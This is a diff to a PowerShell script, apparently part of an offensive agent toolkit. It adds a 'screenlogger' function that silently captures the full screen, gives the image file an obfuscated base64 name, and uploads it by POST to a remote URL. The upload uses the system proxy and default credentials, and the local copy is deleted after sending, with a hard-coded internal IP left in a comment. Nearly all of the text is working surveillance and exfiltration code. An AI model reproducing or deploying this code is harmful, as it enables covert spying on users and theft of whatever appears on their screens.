@@ -111,7 +111,58 @@ function Get-Screenshot
             $wc.Dispose()
         }
 
-        "starting screenlogger on $Agent uploading to $Url (if failed save to $SavePath)"
+        "starting screenlogger on $Agent uploading to $Url (if failed save to $SavePath)`n"
+        function Get-Screenshot
+        {
+            #[String] $Path = "c:\Windows\Temp\"
+            $Time = (Get-Date)
+            [String] $FileName = "Screen Shot $($Time.Year)"
+            $FileName += '-'
+            $FileName += "$($Time.Month)"
+            $FileName += '-'
+            $FileName += "$($Time.Day)"
+            $FileName += ' at '
+            $FileName += "$($Time.Hour)"
+            $FileName += '.'
+            $FileName += "$($Time.Minute)"
+            $FileName += '.'
+            $FileName += "$($Time.Second)"
+            $FileName += '.png'
+            $Bytes = [System.Text.Encoding]::Unicode.GetBytes($FileName)
+            $EncodedName =[Convert]::ToBase64String($Bytes)
+            [String] $FilePath = (Join-Path $SavePath $EncodedName)
+            if (-not ($FilePath | Test-Path)) {
+              Add-Type -Assembly System.Windows.Forms
+              $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
+              $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
+              $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
+              $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
+              $DrawingGraphics.Dispose()
+              $ScreenshotObject.Save($FilePath, [Drawing.Imaging.ImageFormat]::Png)
+              $ScreenshotObject.Dispose()
+
+                #[String] $url = "http://192.168.1.111/"
+                $wc = new-object system.net.WebClient
+                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                try{
+                  $response = $wc.UploadFile($url,"POST",$FilePath);
+                  Remove-Item $FilePath
+                  "upload ok :: $FilePath"
+                }
+                catch [System.Net.WebException]{
+                  "upload failed, download from :: $FilePath"
+                }
+                finally {
+                  $wc.Dispose()
+                }
+
+            }
+        }
+        $sc = (Get-Screenshot)
+        $sc
+
+
 
     }
     else {
